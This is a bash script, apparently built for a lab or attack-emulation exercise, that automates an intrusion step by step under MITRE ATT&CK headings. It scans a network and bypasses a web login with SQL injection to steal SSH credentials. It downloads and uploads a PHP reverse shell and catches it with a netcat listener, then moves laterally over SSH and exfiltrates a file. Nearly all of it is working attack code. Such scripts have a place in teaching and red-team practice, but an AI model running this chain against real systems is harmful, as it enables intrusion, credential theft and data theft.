#!/bin/bash
# FUNCTIONS

ip4_to_int() {
  IFS=. read -r i j k l << EOF
$1
EOF
  echo $(( (i << 24) + (j << 16) + (k << 8) + l ))
}

int_to_ip4() {
  echo "$(( ($1 >> 24) % 256 )).$(( ($1 >> 16) % 256 )).$(( ($1 >> 8) % 256 )).$(( $1 % 256 ))"
}

#################

# Reconnaissance on network
ifconfig
ATTACKER_IP=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
PREFIX=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f2)


# Read IP
IFS=. read -r i1 i2 i3 i4 << EOF
$ATTACKER_IP
EOF

# Read PREFIX
mask=$(( ((1<<32)-1) & (((1<<32)-1) << (32 - $PREFIX)) ))

# Calculate NETWORK
read NETWORK << EOF
$(( $i1 & ($mask>>24) )).$(( $i2 & ($mask>>16) )).$(( $i3 & ($mask>>8) )).$(( $i4 & $mask ))
EOF

# Adding IPs to ignore list
IGNORE_IPs=$(ip4_to_int $NETWORK)
IGNORE_IP_1=$(($IGNORE_IPs+1))
IGNORE_IP_1=$(int_to_ip4 $IGNORE_IP_1)
IGNORE_IP_1=$IGNORE_IP_1$
IGNORE_IP_2=$(($IGNORE_IPs+2))
IGNORE_IP_2=$(int_to_ip4 $IGNORE_IP_2)
IGNORE_IP_2=$IGNORE_IP_2$

# Scanning for web ip
WEB_IP=$(nmap -n -sn $NETWORK/$PREFIX -oG - | awk '/Up$/{print $2}' | grep -v $ATTACKER_IP | grep -v $IGNORE_IP_1 | grep -v $IGNORE_IP_2)
nmap -n -sn $NETWORK/$PREFIX

echo ""
echo "############ RECONNAISSANCE ############"
echo "============ MITRE ATT&CK technique: Active Scanning ============"
nmap -sC -sV -A $WEB_IP
echo "" 

echo ""
echo "############ RECONNAISSANCE ############"
echo "============ MITRE ATT&CK technique: Active Scanning (Wordlist Scanning) ============"
WEB_DIR=$(gobuster dir -u http://$WEB_IP -w /usr/share/wordlists/dirb/small.txt -k -x php -b 404 2>&1 | grep upload.php | cut -d' ' -f1 | grep upload.php)
gobuster dir -u http://$WEB_IP -w /usr/share/wordlists/dirb/small.txt -k -x php -b 404
# REFERENCE
# gobuster dir -u http://192.168.137.248 -w /usr/share/wordlists/dirb/small.txt -k -x php -b 404 2>&1 | grep http://192.168.137.248/ | cut -d'>' -f2 | cut -d']' -f1 | sed -e 's/^[[:space:]]*//' | sed -n -e 2p
echo ""

echo ""
echo "############ RECONNAISSANCE ############"
echo "============ MITRE ATT&CK technique: Active Scanning (Vulnerability Scanning) ============"
n | nikto -h http://$WEB_IP
echo "" 

echo ""
echo "############ Get admin cookie to sql inject authbypass ################"
COOKIE=`curl -s -c - --data-binary $'user=%27OR+1%3D1--%27&pass=%27OR+1%3D1--%27&login=Login' http://$WEB_IP/ -L --location-trusted | grep -oP "PHPSESSID\s\K.*"`
echo "Session cookie"
COOKIE='PHPSESSID='$COOKIE
echo $COOKIE
curl -s -b $COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27
CURLOUTPUT=`curl -b $COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27 | gawk -F "</*td>|</*tr>" ' {print $3, $5, $7 }' | tr -d "\t\n\r" | tr -s ' ' | sed 's/^ *$//g'`
BOSSIP=`echo $CURLOUTPUT | awk '{print $1}'`
SSHUSER=`echo $CURLOUTPUT | awk '{print $2}'`
SSHPASS=`echo $CURLOUTPUT | awk '{print $3}'`

echo ""
echo "############ SQL Injection ############"
curl -b 'PHPSESSID='$COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27
echo ""

echo "===================================================="
echo "############ Extracted boss credentials ############"
echo "===================================================="

echo "" 
echo "############ Downloading Malicious PHP Web Shell ############" 
curl https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php --output shell.php
echo ""

echo "" 
echo "############ Edit IP Address of Web Shell ############"
sed -i "s/127.0.0.1/$ATTACKER_IP/g" shell.php 
echo "############ Done changing to attacker ip ############"
echo ""

echo ""
echo "############ Uploading shell ############" 
echo `pwd` 
echo ""

echo ""
echo "############ EXECUTION ############"
echo "============ MITRE ATT&CK technique: Command and Scripting Interpreter ============"
echo "############ Background listener ############" 
curl -i -X POST -H "Content-Type: multipart/form-data" -F "fileToUpload=@`pwd`/shell.php" http://$WEB_IP/upload.php
gnome-terminal -- nc -lnvp 9000
GNOME=`xdotool search --onlyvisible --class gnome-terminal`
xdotool windowactivate $GNOME
echo ""

echo ""
echo "############ Getting shell ############" 
xdotool windowactivate $MAIN
gnome-terminal -- curl http://$WEB_IP/uploads/shell.php?cmd=id
echo "############ Curl Completed ############"
echo ""

echo ""
echo "############ Getting Interactive Shell ############" 
xdotool windowactivate $GNOME
xdotool type "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" ; xdotool key Return
xdotool type "whoami" ; xdotool key Return
echo ""

echo ""
echo "############ LATERAL MOVEMENT ############"
echo "============ MITRE ATT&CK technique: Remote Services (SSH) ============"
echo "SSH into boss"
xdotool type "ssh -o StrictHostKeyChecking=no $SSHUSER@$BOSSIP" ; xdotool key Return ; sleep 1
xdotool type "$SSHPASS" ; xdotool key Return ; sleep 1
xdotool type "echo \`pwd\`" ; xdotool key Return
xdotool type "ls" ; xdotool key Return ; sleep 1
xdotool type "exit"; xdotool key Return ; sleep 1
echo ""

echo ""
echo "############ Exfiltration ############"
echo "============ MITRE ATT&CK technique: Exfiltration Over Alternative Protocol ============"
xdotool type "scp -22 $SSHUSER@$BOSSIP:personal.txt ."; xdotool key Return ; sleep 2
xdotool type "yes"; xdotool key Return ; sleep 1
xdotool type "$SSHPASS" ; xdotool key Return ; sleep 1
echo ""

echo ""
echo "############ Exfiltration ############"
echo "============MITRE ATT&CK technique: Exfiltration Over Alternative Protocol============"
echo "############ Transferring file to Attacker machine ############"
xdotool windowactivate $MAIN
gnome-terminal -- wget http://$WEB_IP/uploads/personal.txt
echo ""

echo ""
echo "===================================================="
echo "############ BOSS FILES EXFILTRATED ############"
echo "===================================================="
xdotool windowkill $GNOME
echo ""

echo "#################################################"
echo "#################################################"
echo "#################################################"
echo "############# Important Information #############"
echo "#################################################"
echo "#################################################"
echo "#################################################"
echo ""
echo "** ATTACKER_IP/PREFIX **"
echo $ATTACKER_IP/$PREFIX
echo ""
echo "** NETWORK **"
echo $NETWORK/$PREFIX
echo ""
echo "** IPs to ignore **"
echo $IGNORE_IP_1
echo $IGNORE_IP_2
echo ""
echo "** WEB_IP **"
echo $WEB_IP
echo ""
echo "** WEB_DIR **"
echo $WEB_DIR
echo ""
echo "** Session Cookie **"
echo $COOKIE
echo ""
echo "**  Boss SSH Details **"
echo "SSH Credentials"
echo "IP\tUsername\tPassword"
echo "$BOSSIP\t$SSHUSER\t$SSHPASS"
echo ""
echo "** Boss file **"
cat personal.txt
